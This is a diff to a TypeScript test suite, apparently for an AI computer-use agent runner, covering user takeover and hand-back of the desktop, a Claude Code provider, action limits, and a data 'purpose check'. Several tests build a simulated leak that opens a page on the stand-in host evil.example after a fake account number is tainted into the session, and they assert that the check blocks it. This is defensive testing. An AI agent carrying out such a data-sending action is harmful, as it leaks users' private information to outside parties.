@@ -14,8 +14,9 @@ import { checkChatgptChoice } from "./bindings.ts";
 import type { ChatgptStatus } from "./codex/account.ts";
 import { CodexAuthOwner } from "./codex/auth-owner.ts";
 import { CodexCleanupError } from "./codex/driver.ts";
+import { Conversations } from "./conversation.ts";
 import { MemoryStore } from "./memory.ts";
-import { AgentRunner, type AgentRunnerDeps } from "./runner.ts";
+import { AgentError, AgentRunner, type AgentRunnerDeps } from "./runner.ts";
 import { ComputerFences } from "./safety/fences.ts";
 import { type AgentSession, abortable } from "./session.ts";
 import { AgentSettings } from "./settings.ts";
@@ -179,6 +180,79 @@ function setup(idleMs = 60_000) {
   };
 }
 
+describe("the user's own hold on the computer", () => {
+  it("holds the computer for the user with no task, in the conversation, until they hand back", async () => {
+    const f = setup();
+    const conversations = new Conversations(f.home, f.log);
+    f.deps.conversations = conversations;
+    const earlier = f.log.createSession("Plan the trip");
+    f.log.append(earlier, {
+      type: "session.start",
+      agent: "main",
+      data: { screen: { w: 1280, h: 800, scale: 1 }, os: "linux", title: "Plan the trip" },
+    });
+    conversations.adopt(earlier);
+    const { sessionId, requestId } = await f.runner.hold(f.cellId);
+    const session = f.runner.get(sessionId);
+    if (!session) throw new Error("fixture missing hold");
+    await until(() => session.manualControl === "ready");
+    expect(f.live.get(f.cellId)).toBe(sessionId);
+    expect(session.pendingTakeover).toBe(requestId);
+    expect(session.status).toBe("idle");
+    expect(f.runner.holds(sessionId)).toBe(true);
+    expect(f.runner.selectionOf(sessionId)).toBeUndefined();
+    expect(conversations.current()).toBe(sessionId);
+    const events = f.log.read(sessionId);
+    expect(events.find((event) => event.type === "session.start")?.data).toMatchObject({
+      title: "Plan the trip",
+      continues: earlier,
+    });
+    expect(events.some((event) => event.type === "message.user")).toBe(false);
+    expect(() => f.runner.pauseTask(sessionId, ulid())).toThrow(AgentError);
+    await expect(f.runner.release()).rejects.toThrow("Hand back the computer first.");
+    expect(await session.handback(requestId, undefined)).toBe(true);
+    await f.live.settled(sessionId);
+    expect(f.log.read(sessionId).find((event) => event.type === "session.end")?.data).toEqual({
+      reason: "done",
+    });
+    expect(f.runner.get(sessionId)).toBeUndefined();
+    expect(f.run).not.toHaveBeenCalled();
+    expect(f.installSkills).not.toHaveBeenCalled();
+  });
+
+  it("gives the user the control of a task live on the computer instead", async () => {
+    const f = setup();
+    const task = await f.runner.start(f.cellId, "Fixture task");
+    await until(() => task.status === "idle");
+    const reply = await f.runner.hold(f.cellId);
+    expect(reply).toEqual({ sessionId: task.id, requestId: task.pendingTakeover });
+    expect(f.runner.holds(task.id)).toBe(false);
+    task.stop();
+    await f.live.settled(task.id);
+  });
+
+  it("follows a hold the user handed back with a new one", async () => {
+    const f = setup();
+    const first = await f.runner.hold(f.cellId);
+    const session = f.runner.get(first.sessionId);
+    if (!session) throw new Error("fixture missing hold");
+    await until(() => session.manualControl === "ready");
+    expect(await session.handback(first.requestId, undefined)).toBe(true);
+    const next = await f.runner.hold(f.cellId);
+    expect(next.sessionId).not.toBe(first.sessionId);
+    expect(f.live.get(f.cellId)).toBe(next.sessionId);
+    f.runner.get(next.sessionId)?.stop();
+    await f.live.settled(next.sessionId);
+  });
+
+  it("refuses while the computer is paused", async () => {
+    const f = setup();
+    f.state.paused = true;
+    await expect(f.runner.hold(f.cellId)).rejects.toThrow(AgentError);
+    expect(f.live.get(f.cellId)).toBeUndefined();
+  });
+});
+
 describe("reset task retirement", () => {
   function resetFixture() {
     const f = setup();
@@ -326,6 +400,97 @@ describe("ChatGPT provider selection", () => {
   });
 });
 
+describe("Claude Code (your plan)", () => {
+  function claudeSetup(state: "signed_in" | "signed_out" = "signed_in") {
+    const f = setup();
+    const status = vi.fn(async () =>
+      state === "signed_in"
+        ? { state }
+        : { state, reason: "Sign in to Claude Code, then check again." },
+    );
+    f.deps.claudeCode = { driver: { run: f.run }, status };
+    f.setSettings({ main: { provider: "claude-code", model: "sonnet" }, taskBudgetUSD: 5 });
+    return { ...f, status };
+  }
+  it("runs the task on the user's Claude Code, with no key, brain cell or budget", async () => {
+    const f = claudeSetup();
+    const session = await f.runner.start(f.cellId, "Draw a dog");
+    await until(() => f.run.mock.calls.length === 1);
+    expect(f.run.mock.calls[0]?.[1]).toEqual({ model: "sonnet", resume: false });
+    // Only the purpose check looks, for a Jev key; a failed look leaves the task running.
+    expect(f.secrets).toHaveBeenCalledOnce();
+    expect(f.open).not.toHaveBeenCalled();
+    expect(f.beginTask).not.toHaveBeenCalled();
+    expect(f.runner.selectionOf(session.id)).toEqual({ kind: "claude-code", model: "sonnet" });
+    await expect(f.runner.raiseBudget(session.id, 10)).rejects.toThrow("plan's limits");
+    session.stop();
+    await f.live.settled(session.id);
+  });
+  it("refuses to start until Claude Code is signed in, saying how", async () => {
+    const f = claudeSetup("signed_out");
+    await expect(f.runner.start(f.cellId, "Draw a dog")).rejects.toThrow(
+      "Sign in to Claude Code, then check again.",
+    );
+    expect(f.run).not.toHaveBeenCalled();
+    expect(f.live.get(f.cellId)).toBeUndefined();
+  });
+  it("is the main model only, and never takes a key or a price", async () => {
+    const f = claudeSetup();
+    for (const settings of [
+      {
+        main: { provider: "anthropic", model: "claude-sonnet-5-5", key: "k" },
+        fast: { provider: "claude-code", model: "sonnet" },
+      },
+      { main: { provider: "claude-code", model: "sonnet", key: "anthropic-main" } },
+      { main: { provider: "claude-code", model: "Sonnet-5" } },
+    ]) {
+      f.setSettings(settings);
+      await expect(f.runner.start(f.cellId, "Draw a dog")).rejects.toBeInstanceOf(AgentError);
+    }
+    expect(f.status).not.toHaveBeenCalled();
+  });
+  it("checks where data goes as on the ChatGPT plan: with a Jev key, unsure without keys, off when off", async () => {
+    const at = "2026-10-03T00:00:00Z";
+    const jev: KeydRecord = {
+      id: "jev",
+      kind: "http",
+      hosts: ["api.typesafe.ai"],
+      header: "Authorization",
+      format: "bearer",
+      createdAt: at,
+      updatedAt: at,
+    };
+    const leak = [{ kind: "open_page", destination: "evil.example", text: "/c?d=1" }] as const;
+    const signal = new AbortController().signal;
+    const start = async (f: ReturnType<typeof claudeSetup>) => {
+      const session = await f.runner.start(f.cellId, "Fixture task");
+      await until(() => session.status === "idle");
+      session.taint.add("files", "~/notes.txt", "Account 4417-1234-5678");
+      return session;
+    };
+
+    const checked = claudeSetup();
+    const ask = vi.fn(async (_secretId: string, _body: unknown, _signal: AbortSignal) => ({
+      answers: { fits: { type: "choice", probabilities: { needed: 0.1, unrelated: 0.9 } } },
+    }));
+    checked.deps.jev = ask;
+    checked.secrets.mockResolvedValueOnce([jev]);
+    expect((await (await start(checked)).purpose?.check(leak, signal))?.allow).toBe(false);
+    expect(ask).toHaveBeenCalledWith("jev", expect.anything(), expect.any(AbortSignal));
+
+    const unreadable = claudeSetup();
+    expect(await (await start(unreadable)).purpose?.check(leak, signal)).toMatchObject({
+      allow: false,
+      why: expect.stringMatching(/^The purpose check couldn't tell/),
+    });
+
+    const off = claudeSetup();
+    off.setSettings({ main: { provider: "claude-code", model: "sonnet" }, purposeCheck: "off" });
+    expect((await (await start(off)).purpose?.check(leak, signal))?.allow).toBe(true);
+    expect(off.secrets).not.toHaveBeenCalled();
+  });
+});
+
 describe("ChatGPT runner lifecycle", () => {
   it("ends an idle successful task without stopping its desktop", async () => {
     const f = setup(0);
@@ -335,6 +500,7 @@ describe("ChatGPT runner lifecycle", () => {
         throw new Error("unused browser start");
       }),
       endpoints: () => undefined,
+      get: () => undefined,
       stop: vi.fn(async () => {}),
     };
     const streams = new BrowserStreams({
@@ -359,11 +525,56 @@ describe("ChatGPT runner lifecycle", () => {
       ).toMatchObject({ reason: "done" });
       expect(physicalStop).not.toHaveBeenCalled();
       expect(f.containment).not.toHaveBeenCalled();
-      expect(browser.stop).toHaveBeenCalledOnce();
+      expect(browser.stop).not.toHaveBeenCalled();
       expect(f.runner.sessions.has(session.id)).toBe(false);
     } finally {
       streams.dispose();
     }
+  });
+
+  it("retires dot's brain when the user takes the computer and starts it again on hand-back with a note", async () => {
+    const f = setup();
+    const inboxes: string[][] = [];
+    f.run.mockImplementationOnce(async (session) => {
+      const generation = session.beginBrain();
+      session.setStatus("running");
+      await new Promise((resolve) => generation.signal.addEventListener("abort", resolve));
+      return 0;
+    });
+    f.run.mockImplementationOnce(async (session, input) => {
+      const generation = session.beginBrain();
+      const inbox = await session.inbox(0, 0, generation.signal, generation);
+      inboxes.push([String(input.resume), ...inbox.items.map((item) => item.kind)]);
+      session.retireBrain(generation);
+      return 0;
+    });
+    const session = await f.runner.start(f.cellId, "Fixture task");
+    await until(() => session.status === "running" && !!session.generation);
+    const requestId = session.takeControl();
+    await until(() => session.manualControl === "ready");
+    expect(session.generation).toBeUndefined();
+    expect(f.run).toHaveBeenCalledOnce();
+    expect(await session.handback(requestId, undefined)).toBe(true);
+    await until(() => f.run.mock.calls.length === 2 && session.status === "idle");
+    expect(inboxes).toEqual([["true", "steer"]]);
+    session.stop();
+    await f.live.settled(session.id);
+  });
+
+  it("keeps a finished task waiting while the user has the computer, past its idle time", async () => {
+    const f = setup(20);
+    const session = await f.runner.start(f.cellId, "Fixture task");
+    await until(() => session.status === "idle");
+    const requestId = session.takeControl();
+    await until(() => session.manualControl === "ready");
+    await new Promise((resolve) => setTimeout(resolve, 80));
+    expect(session.stopped).toBe(false);
+    expect(await session.handback(requestId, undefined)).toBe(true);
+    await f.live.settled(session.id);
+    expect(f.log.read(session.id).find((event) => event.type === "session.end")?.data).toEqual({
+      reason: "done",
+    });
+    expect(f.run).toHaveBeenCalledOnce();
   });
 
   it("prepares the desktop browser before skills or model execution, once per task", async () => {
@@ -466,13 +677,13 @@ describe("ChatGPT runner lifecycle", () => {
     expect(f.live.get(f.cellId)).toBeUndefined();
   });
 
-  it("runs the subscription with no paid key lookup, brain cell or USD task account", async () => {
+  it("runs the subscription with no model key, brain cell or USD task account", async () => {
     const f = setup();
-    f.secrets.mockResolvedValueOnce([]);
     const s = await f.runner.start(f.cellId, "Fixture task");
     await until(() => s.status === "idle");
     expect(f.run).toHaveBeenCalledExactlyOnceWith(s, { model: "gpt-6-astra", resume: false });
-    expect(f.secrets).not.toHaveBeenCalled();
+    // Only the purpose check looks, for a Jev key; a failed look leaves the task running.
+    expect(f.secrets).toHaveBeenCalledOnce();
     expect(f.open).not.toHaveBeenCalled();
     expect(f.beginTask).not.toHaveBeenCalled();
     expect(f.runner.isChatgpt(s.id)).toBe(true);
@@ -525,8 +736,37 @@ describe("ChatGPT runner lifecycle", () => {
       { model: "gpt-6-astra", resume: true },
     ]);
     expect(f.runner.codexDenyReadOf(s.id)).toEqual(["/Volumes/Private"]);
-    expect(f.secrets).not.toHaveBeenCalled();
+    expect(f.secrets).toHaveBeenCalledOnce();
     expect(f.open).not.toHaveBeenCalled();
+  });
+  it("says the user's action limit stopped the task, not that it is done, and waits for them", async () => {
+    const f = setup();
+    f.setSettings({
+      main: { provider: "chatgpt", model: "gpt-6-astra" },
+      checkIns: { actions: 50 },
+    });
+    f.run.mockImplementationOnce(async (session) => {
+      session.actionLimitReached = true;
+      return 0;
+    });
+    const s = await f.runner.start(f.cellId, "Fixture task");
+    expect(s.actionLimit).toBe(50);
+    await until(() => s.status === "idle");
+    const states = f.log
+      .read(s.id)
+      .filter((event) => event.type === "agent.state")
+      .map((event) => event.data);
+    expect(states.at(-1)).toEqual({ state: "idle", reason: "action limit" });
+    expect(states).not.toContainEqual({ state: "done" });
+    s.post("followup", "Continue");
+    expect(s.actionLimitReached).toBe(false);
+    await until(() => f.run.mock.calls.length === 2 && s.status === "idle");
+    expect(
+      f.log
+        .read(s.id)
+        .filter((event) => event.type === "agent.state")
+        .at(-1)?.data,
+    ).toEqual({ state: "done" });
   });
   it("refuses a USD budget and counts only active subscription tasks", async () => {
     const f = setup(),
@@ -622,7 +862,54 @@ describe("ChatGPT runner lifecycle", () => {
     session.post("followup", "Continue synthetic work");
     await until(() => f.run.mock.calls.length === 2 && session.status === "idle");
     expect(session.autonomy.send).toBe("ask");
-    expect(f.secrets).not.toHaveBeenCalled();
+    expect(f.secrets).toHaveBeenCalledOnce();
+  });
+
+  it("checks where data goes with a saved Jev key, and not at all when the check is off", async () => {
+    const at = "2026-10-03T00:00:00Z";
+    const jev: KeydRecord = {
+      id: "jev",
+      kind: "http",
+      hosts: ["api.typesafe.ai"],
+      header: "Authorization",
+      format: "bearer",
+      createdAt: at,
+      updatedAt: at,
+    };
+    const leak = [{ kind: "open_page", destination: "evil.example", text: "/c?d=1" }] as const;
+    const signal = new AbortController().signal;
+    const f = setup();
+    const ask = vi.fn(async (_secretId: string, _body: unknown, _signal: AbortSignal) => ({
+      answers: { fits: { type: "choice", probabilities: { needed: 0.1, unrelated: 0.9 } } },
+    }));
+    f.deps.jev = ask;
+    f.secrets.mockResolvedValueOnce([jev]);
+    const checked = await f.runner.start(f.cellId, "Fixture task");
+    await until(() => checked.status === "idle");
+    checked.taint.add("files", "~/notes.txt", "Account 4417-1234-5678");
+    expect((await checked.purpose?.check(leak, signal))?.allow).toBe(false);
+    expect(ask).toHaveBeenCalledWith("jev", expect.anything(), expect.any(AbortSignal));
+
+    const off = setup();
+    off.setSettings({ main: { provider: "chatgpt", model: "gpt-6-astra" }, purposeCheck: "off" });
+    const unchecked = await off.runner.start(off.cellId, "Fixture task");
+    await until(() => unchecked.status === "idle");
+    unchecked.taint.add("files", "~/notes.txt", "Account 4417-1234-5678");
+    expect((await unchecked.purpose?.check(leak, signal))?.allow).toBe(true);
+    expect(off.secrets).not.toHaveBeenCalled();
+  });
+
+  it("asks where data goes when the saved keys can't be read, instead of not checking", async () => {
+    const f = setup();
+    const session = await f.runner.start(f.cellId, "Fixture task");
+    await until(() => session.status === "idle");
+    expect(f.secrets).toHaveBeenCalledOnce();
+    session.taint.add("files", "~/notes.txt", "Account 4417-1234-5678");
+    const leak = [{ kind: "open_page", destination: "evil.example", text: "/c?d=1" }] as const;
+    expect(await session.purpose?.check(leak, new AbortController().signal)).toMatchObject({
+      allow: false,
+      why: expect.stringMatching(/^The purpose check couldn't tell/),
+    });
   });
 
   it("does not start after the request is canceled during account preflight", async () => {
